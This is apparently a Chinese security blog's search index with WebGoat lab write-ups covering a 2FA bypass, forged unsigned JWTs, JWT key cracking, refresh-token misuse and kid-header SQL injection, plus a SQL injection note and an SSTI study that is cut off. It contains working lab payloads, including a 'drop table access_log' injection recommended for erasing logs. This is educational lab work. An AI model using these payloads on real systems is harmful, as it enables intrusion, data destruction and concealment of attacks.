<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WebGoat-Authentication_Bypasses_1</title>
      <link href="/2023/11/19/WebGoat-Authentication-Bypasses/"/>
      <url>/2023/11/19/WebGoat-Authentication-Bypasses/</url>
      
        <content type="html"><![CDATA[<h1 id="2FA"><a href="#2FA" class="headerlink" title="2FA"></a>2FA</h1><p>这道题他先给了一个例子，<a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass</a></p><p>是一个绕过PayPal 2FA的案例，案例中把认证的问题字段抓包删除之后发送直接绕过了验证。</p><span id="more"></span><p>照着这个思路做他给的这道题，直接删除字段好像不行，我们先审计一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191024345.png" alt="image-20231119102436245"></p><p>可以看到，想要返回success，需要<code>verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)</code></p><p>返回False，然后<code>verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers)</code>为True，跟进这两个函数看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191028892.png" alt="image-20231119102805345"></p><p>想要<code>didUserLikelylCheat</code>返回0，不能提交正确的答案，他这道题就是让我们必须绕过验证，他这里检查的作弊应该是直接用源码里的验证答案~到这里删除包里的答案字段应该是可以行得通的，继续往下看为什么不可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191115968.png" alt="image-20231119103208557"></p><p>想要<code>verifyAccount</code>返回1，对于map的size()方法是返回键值对的个数，这里他检测了输入的键值对数量是否和答案的键值对数量是否相同，因此不能直接删除包里的答案字段了，后面两个if是检测输入的值和答案相同，最终返回true。</p><p>目前看来，我们必须输入两个答案字段（两个键值对），并且必须携带错误的答案绕过作弊检测，输入正确的答案绕过身份验证，看起来好像很矛盾，但是如果我们的键没有他要检测的这两个键就可以直接绕过身份验证的if检测：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191118060.png" alt="image-20231119111849009"></p><p>但是似乎回显并不正确？看一看键值对怎么传进去的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191116440.png" alt="image-20231119111637385"></p><p>原来是需要包含secQuestion字段的键，但是str.contains()方法是检测子句是否包含，也就是说我们传入包含键名secQuestion字段的键就可以了，比如secQuestiona、secQuestionb：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119655.png" alt="image-20231119111925607"></p><p>通过辣：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311191119526.png" alt="image-20231119111939481"></p><h1 id="JWT-4"><a href="#JWT-4" class="headerlink" title="JWT-4"></a>JWT-4</h1><p>关于jwt不再赘述，这里先看题</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200947836.png" alt="image-20231120094744680"></p><p>这里让修改账户的jwt使之成为管理员用户，然后投票，先抓包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200949474.png" alt="image-20231120094958421"></p><p>与此同时，我们还看见了access_token&#x3D;””，很奇怪：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200957608.png" alt="image-20231120095737558"></p><p>看见了jwt，但是不知道如何判定身份，进入源码审计一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311200959298.png" alt="image-20231120095943236"></p><p>这里大致看得出来是通过<code>admin</code>把作为身份判定的关键字，这里可以构造</p><pre><code>&quot;adimn&quot;:&quot;true&quot;</code></pre><p>isadmin因为是bool类型，直接传入True,发现验证还是没通过，找一下这个access_token:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110366.png" alt="image-20231120101425320"></p><p>先看到如果user的值包含在vaildUsers中，就会加入非admin的jwt，否则判定为未认证，再往下看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110368.png" alt="image-20231120101953066"></p><p>从这一段看accessToken不能为空，否则会被限制为guest，与此同时user值不能为Guset，也不是vaildUser的子段。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110369.png" alt="image-20231120102425875"></p><p>跟之前差不多，似乎只要不为空即可</p><p>但是又发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110370.png" alt="image-20231120103450762"></p><p>400了，看了一下路由，发现是提交到refresh的，到这段路由看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110371.png" alt="image-20231120104224931"></p><p>发现虽然没有解析admin，但也不至于报错，而且required &#x3D; false？仔细检查发现json不同键值对之间要用<code>,</code>间隔~</p><p>修改后发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110372.png" alt="image-20231120104401256"></p><p>这里应该生成token，这道题的入口应该不在这里，因为根据这段路由来看我们无法自建用户和密码通过验证，最终导致UNAUTHORIZED</p><p>其实目前看来，需要找传到这段路由的数据然后修改包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110374.png" alt="image-20231120104700675"></p><p>然后抓到了这个包：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110375.png" alt="image-20231120104828334"></p><p>但是发现不行，突然发现有一个切换用户的地方，笑死，还是太急躁了，没有好好检查页面就开始乱审计，先点击切换用户登录，这时候就可以点击重置投票的按钮了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110376.png" alt="image-20231120152102403"></p><p>这里还是得用专门的网站，不然解码有乱码，修改后加密发送很可能出问题：<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110377.png" alt="image-20231120110120545"></p><p>这里有一个坑，题目是没有签名的，所以把header和payload贴过去就可以了，后面蓝色部分是网站初始化生成的，不是我们需要的，所以我的最终payload是：</p><pre><code>eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDEzMjg0ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></pre><h1 id="JWT-5"><a href="#JWT-5" class="headerlink" title="JWT-5"></a>JWT-5</h1><p>这题是jwt破解，找个工具用rockyou.txt跑一下就可以了,要把exp时间戳修改到未过期的时间</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>他这里提到了一个无状态会话：</p><pre><code>&#123;    &quot;token_type&quot;:&quot;bearer&quot;,    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,    &quot;expires_in&quot;:10,    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;&#125;</code></pre><p>原文：</p><blockquote><p>正如你所看到的，刷新令牌是一个随机字符串，服务器可以跟踪它（在内存或数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，只要访问令牌仍然有效，我们就可以称之为“无状态”会话，服务器端就没有设置用户会话的负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保该令牌不会以任何方式被阻止。 每当攻击者持有访问令牌时，该令牌仅在一定时间内有效（例如10分钟）。然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。也可以使刷新令牌无状态，但这意味着查看用户是否吊销了令牌将变得更加困难。服务器完成所有验证后，必须向客户端返回一个新的刷新令牌和一个新访问令牌。客户端可以使用新的访问令牌来进行API调用。</p></blockquote><p>看起来jwt只给了一个10分钟但是我们不知道是什么时候开始什么时候结束</p><p>原文：</p><blockquote><p>你应该检查什么？ </p><p>无论选择哪种解决方案，都应该在服务器端存储足够的信息，以验证用户是否仍然可信。你可以考虑很多事情，比如存储ip地址，跟踪刷新令牌的使用次数（在访问令牌的有效时间窗口中多次使用刷新令牌可能表明有奇怪的行为，你可以撤销所有令牌，让用户再次进行身份验证）。还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会使用攻击者的刷新令牌为其他用户获取新的访问令牌（请参阅<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/%E5%86%99%E4%B8%80%E7%AF%87%E5%85%B3%E4%BA%8E%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%90%E4%BD%9C%E7%9A%84%E5%A5%BD%E6%96%87%E7%AB%A0%EF%BC%89%E6%AD%A4%E5%A4%96%EF%BC%8C%E6%A3%80%E6%9F%A5%E7%94%A8%E6%88%B7%E7%9A%84ip%E5%9C%B0%E5%9D%80%E6%88%96%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%E4%B9%9F%E6%98%AF%E4%B8%80%E4%BB%B6%E5%A5%BD%E4%BA%8B%E3%80%82%E5%A6%82%E6%9E%9C%E6%82%A8%E9%9C%80%E8%A6%81%E5%8F%91%E6%94%BE%E6%96%B0%E7%9A%84%E4%BB%A4%E7%89%8C%EF%BC%8C%E8%AF%B7%E6%A3%80%E6%9F%A5%E4%BD%8D%E7%BD%AE%E6%98%AF%E5%90%A6%E4%BB%8D%E7%84%B6%E7%9B%B8%E5%90%8C%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%92%A4%E9%94%80%E6%89%80%E6%9C%89%E4%BB%A4%E7%89%8C%E5%B9%B6%E8%AE%A9%E7%94%A8%E6%88%B7%E5%86%8D%E6%AC%A1%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%89%E3%80%82">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/写一篇关于这种攻击是如何运作的好文章）此外，检查用户的ip地址或地理位置也是一件好事。如果您需要发放新的令牌，请检查位置是否仍然相同（如果不撤销所有令牌并让用户再次进行身份验证）。</a></p></blockquote><ul><li>储存ip</li><li>跟踪刷新令牌次数</li><li>跟踪哪个访问令牌属于哪个刷新令牌</li></ul><p>原文：</p><blockquote><p>需要刷新令牌 在现代单页应用程序（SPA）中使用刷新令牌有意义吗？</p><p>正如我们在关于存储令牌的部分中所看到的，有两种选择：网络存储或cookie，这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌被泄露，刷新令牌也可能被泄露。当然，大多数时候都是有区别的。访问令牌是在您进行API调用时发送的，刷新令牌仅在应该获得新的访问令牌时发送，在大多数情况下，该访问令牌是不同的端点。如果您最终在同一台服务器上，您可以选择只使用访问令牌。 如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些优势，使其不必反复检查访问令牌。仅当用户需要新的访问令牌时才执行检查。当然，只使用访问令牌是可能的。在服务器上，您存储的信息与为刷新令牌存储的信息完全相同，请参阅上一段。通过这种方式，您每次都需要检查令牌，但根据应用程序的不同，这可能是合适的。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。 JWT是个好主意吗？ 有很多可用的资源对使用JWT令牌进行Cookie的客户端到服务器身份验证的用例提出了质疑。使用JWT令牌的最佳位置是服务器与服务器之间的通信。在普通的web应用程序中，您最好使用普通的旧cookie。有关详细信息，请参阅：</p><ul><li><a href="http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/">stop-using-jwt-for-sessions</a></li><li><a href="http://cryto.net/~joepie91/blog/2016/06/19/stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work/">stop-using-jwt-for-sessions-part-2-why-your-solution-doesnt-work</a></li></ul></blockquote><ul><li>访问令牌泄露和刷新令牌泄露大多数时候是有区别的</li><li>使用JWT令牌的最佳位置是服务器与服务器之间的通信</li></ul><p>可能翻译有点问题，后面或许会单独开一篇研究上面提到的文章链接</p><h1 id="jwt-7"><a href="#jwt-7" class="headerlink" title="jwt-7"></a>jwt-7</h1><p>这题先给了一个案例<a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">here</a>，大概是刷新令牌没有和访问令牌或者用户绑定，我可以用自己的刷新令牌刷新别人的令牌，大概过程是</p><pre><code>&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125;</code></pre><p>这里收到了一个刷新令牌”refresh_token”:”ABC123”</p><p>然后发送</p><pre><code>POST /auth/refresh HTTP/1.1Host: auth.example.comContent-Type: application/jsonAuthorization: Bearer XXX.YYY.ZZZ&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;</code></pre><p>最终收到了新的令牌</p><p>然后回到这道题：From a breach of last year the following logfile is available <a href="http://172.20.10.3:8080/WebGoat/images/logs.txt">here</a> Can you find a way to order the books but let <strong>Tom</strong> pay for them?</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110378.png" alt="image-20231120163752336"></p><p>我们先点击链接看看日志里面有一个token，解密得到：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110379.png" alt="image-20231120164041633"></p><p>但是我们并没有得到刷新令牌之类的，还是审计一下源码。</p><p>有了之前的经验，这次直接找到提交的路由先进行审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110380.png" alt="image-20231120165855282"></p><p>总的来说，需要创建一个header为Authorization，然后把字符串<code>Bearer </code>(这里字符串后面有一个空格)替换为空，不知道是不是必要的（后来抓包发现是自带的），处理后的字符串进行了jwt解析，也就是说传入的数据是这样的（看了wp然后又审了一遍才反应过来的，又学到了hh）：</p><pre><code>Authorization:  Bearer &#123;JWT&#125; </code></pre><p>   然后要user值为Tom，至于alg是否置空似乎都可以success</p><p>再看看刷新token部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110381.png" alt="image-20231120170427057"></p><p>和上面重叠的比较多，这里需要user和refreshToken都不为空，refreshToken来自我们传入的请求体，是一个json，也就是jwt，同时他要存在于validRefreshTokens，追一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110382.png" alt="image-20231120170914764"></p><p>这里发现是20个随机字母，这里他或许会自己生成</p><p>当然这些只是顺带看一眼，我们按照之前log拿到的JWT，修改一下时间戳，发送试试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110383.png" alt="image-20231120172549432"></p><p>ok了</p><h1 id="jwt-8"><a href="#jwt-8" class="headerlink" title="jwt-8"></a>jwt-8</h1><p>这道题很奇怪，源码中找不到对应的路由，但是其对应的源码应该就是这一段：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110384.png" alt="image-20231121095746850"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110385.png" alt="image-20231121100034949"></p><p>这里看起来有一个很明显的sql注入，大概逻辑是header中传入一个kid然后与数据库比对，返回查询结果 ；然后payload中的username为Tom即可success，尝试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110386.png" alt="image-20231121102201508"></p><p>发现返回“Not a valid JWT token”，再审审：</p><p>这里存在一个jwt解析器，之前没看明白：</p><p><a href="https://www.jianshu.com/p/6bfeb86885a3">JJWT使用笔记（二）—— JWT token的解析 - 简书 (jianshu.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110387.png" alt="image-20231121103952935"></p><p>这个解析器可以发现我的jwt没签名，因此返回错误，但是我怎么知道签名呢？看</p><p>这个setSigningKeyResolver</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110388.png" alt="image-20231121104250134"></p><p>他这里跟示例不一样，使用了一个获取器里包含箭头函数，应该是特定用法，用于动态获取SigningKey，暂不深究语法。然后是sql查询根据kid找到对应的SigningKey，并进行了base64解码，为什么要解码呢？因为查询出来的SigningKey应该是base64加密的，此时我们让kid查询返回为空，然后union插入一段base64加密后的字段（SigningKey），那么我们就可以控制SigningKey了</p><pre><code>water3 =&gt; d2F0ZXIz</code></pre><p>这里有个小坑：</p><p>看着时post发包下意识使用<code>#</code>注释，但是这里可能上下文不支持服务器会出错，需要使用<code>--</code>来注释：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110389.png" alt="image-20231121110851500"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311211110390.png" alt="image-20231121110909467"></p><p>ok了</p>]]></content>
      
      
      
        <tags>
            
            <tag> WebGaot </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 2FA </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebGoat-Sql</title>
      <link href="/2023/11/18/WebGoat-Sql/"/>
      <url>/2023/11/18/WebGoat-Sql/</url>
      
        <content type="html"><![CDATA[<p>学习webgoat靶场的时候遇到一个有意思的sql注入</p><p>在这之前值得一提的是，sql的所有操作都会记录到<strong>access_log</strong>这个表中，如果可以堆叠注入，最后记得要清除这个表：</p><pre><code>1&#39;;drop table access_log; -- -</code></pre><p>然后是一道sql：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181522955.png" alt="image-20231118152250268"></p><p>首先探测一下注入点</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181611314.png" alt="img"></p><p>这里是实际是成功执行了查询，显示没有结果，所以没有注入点，否则应该会报错</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181526454.png" alt="image-20231118152647292"></p><p>这里比较扯，他说这个名字存在，但其实应该是注入生效返回了True</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181528156.png" alt="image-20231118152823527"></p><p>对密码进行测试的时候直接创建了，然而我两次输入的密码明明是不一样的，这里把握搞晕了。后来查看了一下博客发现我跑偏题了，username这里能进行注入，那么通过这个地方要么查询要么修改Tom的密码然后登陆</p><p>然后到了bool盲注的阶段，这里不再赘述了，只是个人经验不是很足，对这个回显麻痹了一下，觉得挺有意思的。</p><h2 id="然后是一些防御："><a href="#然后是一些防御：" class="headerlink" title="然后是一些防御："></a>然后是一些防御：</h2><h3 id="静态查询"><a href="#静态查询" class="headerlink" title="静态查询"></a>静态查询</h3><pre><code>SELECT * FROM users WHERE user = &quot;&#39;&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;&#39;&quot;;</code></pre><p>这里专门查询了一下：</p><pre><code>- 静态 SQL：静态 SQL 语句一般用于嵌入式 SQL 应用中，在程序运行前，SQL 语句必须是确定的，例如 SQL 语句中涉及的列名和表名必须是存在的。静态 SQL 语句的编译是在应用程序运行前进行的，编译的结果会存储在数据库内部。而后程序运行时，数据库将直接执行编译好的 SQL 语句，降低运行时的开销。静态SQL在编译时已经确定了引用的表和列。 宿主变量不改变表和列信息。 可以使用主变量改变查询参数值， 但是不能用主变量代替表名或列名。- 动态 SQL：动态 SQL 语句是在应用程序运行时被编译和执行的，不在编译时确定 SQL 的表和列，而是让程序在运行时提供，并将SQL 语句文本传给 DBMS 执行。 静态 SQL 语句在编译时已经生成执行计划。 而动态 SQL 语句，只有在执行时才产生执行计划。动态 SQL 语句首先执行 PREPARE 语句要求 DBMS 分析、确认和优化语句，并为其生成执行计划。例如，使用 DB2 的交互式工具 CLP 访问数据库时，用户输入的 SQL 语句是不确定的，因此 SQL 语句只能被动态地编译。动态 SQL 的应用较多，常见的 CLI 和 JDBC 应用程序都使用动态 SQL。</code></pre><p>所以这里的静态语句是直接确定的，在程序运行以前就编译好了，用户无法自主控制</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>这个就不说了，预编译虽然是一个非常有效的的sql注入防御方法，但是听D4n师傅说有些语句和sql的特性注定了会被注入，然后简单查询了一下：</p><p>[SQL预编译的绕过_sql注入绕过预编译-CSDN博客](<a href="https://blog.csdn.net/AoaNgzh/article/details/130459165#:~:text=SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E7%BB%95%E8%BF%87">https://blog.csdn.net/AoaNgzh/article/details/130459165#:~:text=SQL预编译的绕过</a> 1 字符串拼接：如果在SQL预编译语句中使用了字符串拼接，攻击者可以通过构造特定的字符串来绕过预编译过程。 2,动态拼接SQL语句：如果动态地拼接SQL语句，例如使用字符串拼接、字符串格式化等方式，攻击者同样可以利用字符串的特性来绕过预编译过程。 3 SQL语句中使用函数或存储过程：如果在SQL语句中使用了函数或存储过程，攻击者可以构造恶意的输入，使其执行预期之外的操作，绕过预编译过程。 4 错误处理不当：如果SQL预编译过程中的错误处理不当，例如忽略异常或者异常处理不当，攻击者可能会通过特定的输入来触发错误，绕过预编译过程。)</p><p>显然虽然可以绕过，但是明显已经有了很强的局限性</p><h3 id="最后是转义字符，即过滤掉一些特殊字符，以及WAF"><a href="#最后是转义字符，即过滤掉一些特殊字符，以及WAF" class="headerlink" title="最后是转义字符，即过滤掉一些特殊字符，以及WAF"></a>最后是转义字符，即过滤掉一些特殊字符，以及WAF</h3>]]></content>
      
      
      
        <tags>
            
            <tag> WebGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SSTI的简单研究</title>
      <link href="/2023/11/13/SSTI/"/>
      <url>/2023/11/13/SSTI/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://ghostasky.github.io/2022/03/29/SSTI/#gallery">SSTI payload记录 | 郁涛丶’s Blog (ghostasky.github.io)</a></p><p>大纲参考：</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://ghostasky.github.io/2022/03/29/SSTI/">SSTI payload记录 | 郁涛丶’s Blog (ghostasky.github.io)</a></p><p>这里只是了解一下模板的大致原理，不对如何构造payload过多强求</p><p>对于绕过黑名单的一些方法等后续遇到一个学一个，这里也不过多耗费精力，因为根本记不住hh</p><h1 id="PHP-ssti"><a href="#PHP-ssti" class="headerlink" title="PHP ssti"></a>PHP ssti</h1><h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p><a href="https://www.runoob.com/w3cnote/composer-install-and-usage.html">Composer 安装与使用 | 菜鸟教程 (runoob.com)</a></p><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arrow_functions">箭头函数 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://zhuanlan.zhihu.com/p/366240343">搞明白JavaScript中的匿名函数 - 知乎 (zhihu.com)</a></p><p><a href="https://juejin.cn/post/7041055543984652319">这一次，彻底搞懂箭头函数 - 掘金 (juejin.cn)</a></p><p>箭头函数表达式的语法比<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/function">函数表达式</a>更简洁，并且没有自己的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this"><code>this</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>或<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new.target"><code>new.target</code></a>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。</p><h2 id="Twig-基础"><a href="#Twig-基础" class="headerlink" title="Twig 基础"></a>Twig 基础</h2><p><a href="https://geek-docs.com/php/php-tutorial/php-twig.html#ftoc-heading-1">PHP Twig 教程|极客教程 (geek-docs.com)</a></p><p><a href="https://www.osgeo.cn/twig/filters/map.html">map — Twig 文档 (osgeo.cn)</a></p><p>先按照教程尝试简单的例子来了解Twig如何运作：</p><p>first.php：</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/vendor/autoload.php&#39;;use Twig\Environment;use Twig\Loader\FilesystemLoader;$loader = new FilesystemLoader(__DIR__ . &#39;/templates&#39;);$twig = new Environment($loader);echo $twig-&gt;render(&#39;first.html.twig&#39;, [&#39;name&#39; =&gt; &#39;John Doe&#39;,     &#39;occupation&#39; =&gt; &#39;gardener&#39;]);</code></pre><p>这里使用<code>FilesystemLoader</code>从指定目录加载模板</p><p>输出通过<code>render()</code>生成。 它带有两个参数：模板文件和数据。</p><p>这里再补充一下render()，大概就是渲染加载的意思：</p><p><a href="https://juejin.cn/post/7030362678199582734">Vue中 渲染函数（render）的介绍和应用 - 掘金 (juejin.cn)</a></p><p>templates&#x2F;first.html.twig</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;        &#123;&#123; name &#125;&#125; is a &#123;&#123; occupation &#125;&#125;    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>变量以<code>&#123;&#123;&#125;&#125;</code>语法输出。</p><p>filters.php</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/vendor/autoload.php&#39;;use Twig\Environment;use Twig\Loader\FilesystemLoader;$loader = new FilesystemLoader(__DIR__ . &#39;/templates&#39;);$twig = new Environment($loader);$words = [&#39;sky&#39;, &#39;mountain&#39;, &#39;falcon&#39;, &#39;forest&#39;, &#39;rock&#39;, &#39;blue&#39;];$sentence = &#39;today is a windy day&#39;;echo $twig-&gt;render(&#39;filter.html.twig&#39;,     [&#39;words&#39; =&gt; $words, &#39;sentence&#39; =&gt;$sentence]);</code></pre><p>templates&#x2F;filters.html.twig</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Filters&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;     The array has &#123;&#123; words | length &#125;&#125; elements    &lt;/p&gt;    &lt;p&gt;     Joined array elements: &#123;&#123; words | join(',') &#125;&#125;     &lt;/p&gt;        &lt;p&gt;     &#123;&#123; sentence | title &#125;&#125;     &lt;/p&gt;        &lt;/body&gt;&lt;/html&gt;</code></pre><p>if 、for等内容不再赘述，看看set标签：</p><h3 id="set标签"><a href="#set标签" class="headerlink" title="set标签"></a><code>set</code>标签</h3><p>允许将值设置为模板内的变量。</p><pre><code class="php">$words = [&#39;sky&#39;, &#39;mountain&#39;, &#39;falcon&#39;, &#39;forest&#39;,    &#39;rock&#39;, &#39;blue&#39;, &#39;solid&#39;, &#39;book&#39;, &#39;tree&#39;];echo $twig-&gt;render(&#39;test.html.twig&#39;, [&#39;words&#39; =&gt; $words]);</code></pre><pre><code class="php">&#123;% set sorted = words | sort %&#125;&lt;ul&gt;&#123;% for word in sorted %&#125;    <li>&#123;&#123; word &#125;&#125;</li>&#123;% endfor %&#125;&lt;/ul&gt;</code></pre><h3 id="verbatim标签"><a href="#verbatim标签" class="headerlink" title="verbatim标签"></a>verbatim标签</h3><p><code>verbatim</code>将部分标记为不应该分析的原始文本。</p><pre><code class="php">&#123;% verbatim %&#125;    <ul>    &#123;% for word in words %&#125;        <li>&#123;&#123; word &#125;&#125;</li>    &#123;% endfor %&#125;    </ul>&#123;% endverbatim %&#125;</code></pre><h3 id="Twig-自动转义"><a href="#Twig-自动转义" class="headerlink" title="Twig 自动转义"></a>Twig 自动转义</h3><p>Twig 自动转义某些字符，例如&lt;或&gt;。可以使用<code>autoescape</code>选项关闭自动转义</p><pre><code class="php">$twig = new Environment($loader, [    &#39;autoescape&#39; =&gt; false]);</code></pre><pre><code class="php">$data = &quot;&lt;script src=&#39;http::/example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&quot;;echo $twig-&gt;render(&#39;autoescape.html.twig&#39;, [&#39;data&#39; =&gt; $data]);</code></pre><pre><code class="php">&lt;p&gt;The data is &#123;&#123; data &#125;&#125;&lt;/p&gt;&lt;p&gt;The data is &#123;&#123; data | raw &#125;&#125;&lt;/p&gt;</code></pre><p>如果启用了自动转义，我们可以使用<code>raw</code>过滤器显示原始输入。</p><pre><code class="php">&lt;p&gt;The data is &lt;script src=&#39;http://example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&lt;/p&gt;&lt;p&gt;The data is &lt;script src=&#39;http://example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&lt;/p&gt;</code></pre><p>其后的内容暂不研究，先回到主题–SSTI</p><h2 id="Twig-SSTI"><a href="#Twig-SSTI" class="headerlink" title="Twig SSTI"></a>Twig SSTI</h2><p>这里研究一下这篇博客：<a href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com)</a></p><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p><code>map</code> 对应的函数是<code>twig_array_map</code> ,下面是其实现</p><pre><code>function twig_array_map($array, $arrow)&#123;    $r = [];    foreach ($array as $k =&gt; $v) &#123;        $r[$k] = $arrow($v, $k);    &#125;    return $r;&#125;</code></pre><p>从上面的代码我们可以看到，$arrow 是可控的，将数组的键值对分别作为箭头函数的两个参数，然后将执行结果赋值给$r，漏洞就来自这里。</p><p>arrow 